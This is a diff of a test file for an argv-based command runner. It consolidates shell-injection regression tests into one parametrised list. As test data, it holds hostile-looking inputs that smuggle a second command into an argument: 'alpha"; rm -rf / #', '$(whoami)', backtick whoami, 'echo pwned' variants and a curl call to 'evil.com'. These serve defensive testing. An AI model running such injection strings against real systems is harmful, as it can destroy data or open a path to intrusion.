@@ -38,17 +38,6 @@ describe("run with argv array", () => {
     expect(() => runner.run(["\0echo"], { suppressOutput: true })).toThrow(/NUL bytes/);
   });
 
-  it("does not interpret shell metacharacters in arguments", () => {
-    // If shell interpretation occurred, $(whoami) would be expanded
-    const result = runner.runCapture(["echo", "$(whoami)", "&&", "rm", "-rf", "/"], {
-      ignoreError: true,
-    });
-    // echo receives literal argv — no shell expansion
-    expect(result).toContain("$(whoami)");
-    expect(result).toContain("&&");
-    expect(result).toContain("rm");
-  });
-
   it("rejects string commands", () => {
     // @ts-expect-error Exercise the runtime guard for legacy string input.
     expect(() => runner.run("echo hello", { suppressOutput: true })).toThrow(/argv array instead/);
@@ -100,8 +89,11 @@ describe("runInteractiveShell", () => {
 });
 
 describe("runCapture with argv array", () => {
-  it("captures stdout from a simple command", () => {
-    const output = runner.runCapture(["echo", "hello world"]);
+  it.each([
+    ["echo", "hello world"],
+    ["sh", "-c", "echo 'hello world'"],
+  ])("captures stdout from an explicit %s command", (...argv) => {
+    const output = runner.runCapture(argv);
     expect(output).toBe("hello world");
   });
 
@@ -110,13 +102,13 @@ describe("runCapture with argv array", () => {
     expect(output).toBe("trimmed");
   });
 
-  it("trims trailing blank lines so callers can safely parse the last line", () => {
+  it("preserves output lines while trimming trailing blank lines", () => {
     const output = runner.runCapture([
       process.execPath,
       "-e",
-      'process.stdout.write("2048\\n\\n")',
+      'process.stdout.write("line1\\n2048\\n\\n")',
     ]);
-    expect(output).toBe("2048");
+    expect(output).toBe("line1\n2048");
   });
 
   it("throws when argv array is empty", () => {
@@ -156,34 +148,14 @@ describe("runCapture with argv array", () => {
     expect(output).toBe(["stdout-line", "stderr-line"].join("\n"));
   });
 
-  it("throws on failure without ignoreError", () => {
-    expect(() => runner.runCapture(["false"])).toThrow();
+  it.each([undefined, false])("throws on failure when ignoreError is %s", (ignoreError) => {
+    expect(() => runner.runCapture(["false"], { ignoreError })).toThrow();
   });
 
   it("rejects shell: true to prevent security bypass", () => {
     expect(() => runner.runCapture(["echo", "hi"], { shell: true })).toThrow(
       /shell option is forbidden/,
     );
-  });
-
-  it("prevents shell injection via argument values", () => {
-    // Dangerous sandbox name that would cause injection with shell strings
-    const maliciousName = 'alpha"; rm -rf / #';
-    const output = runner.runCapture(["echo", maliciousName]);
-    // With argv, the string is passed literally — no shell interpretation
-    expect(output).toBe(maliciousName);
-  });
-
-  it("prevents injection via dollar-sign expansion", () => {
-    const output = runner.runCapture(["echo", "${HOME}"]);
-    // Literal ${HOME}, not expanded
-    expect(output).toBe("${HOME}");
-  });
-
-  it("prevents injection via backtick expansion", () => {
-    const output = runner.runCapture(["echo", "`whoami`"]);
-    // Literal backticks, not expanded
-    expect(output).toBe("`whoami`");
   });
 
   it("handles arguments with spaces and special characters", () => {
@@ -219,16 +191,12 @@ describe("shell injection regression tests", () => {
     "sandbox' || echo pwned",
     'sandbox" && echo pwned',
     "sandbox\necho pwned",
-  ])("sandbox names with shell metacharacters are safe with argv arrays [%s]", (name) => {
-    // These names would cause injection if passed through bash -c
-
-    const output = runner.runCapture(["echo", name], { ignoreError: true });
-    // Each name should be passed literally, not interpreted
-    expect(output).toContain(name.split("\n")[0]);
-  });
-
-  it("model names with shell metacharacters are safe with argv arrays", () => {
-    const output = runner.runCapture(["echo", "nvidia/model;curl http://evil.com"]);
-    expect(output).toBe("nvidia/model;curl http://evil.com");
+    'alpha"; rm -rf / #',
+    "${HOME}",
+    "`whoami`",
+    "hello world; $(whoami)",
+    "nvidia/model;curl http://evil.com",
+  ])("passes shell metacharacters as literal arguments [%s]", (value) => {
+    expect(runner.runCapture(["echo", value])).toBe(value);
   });
 });
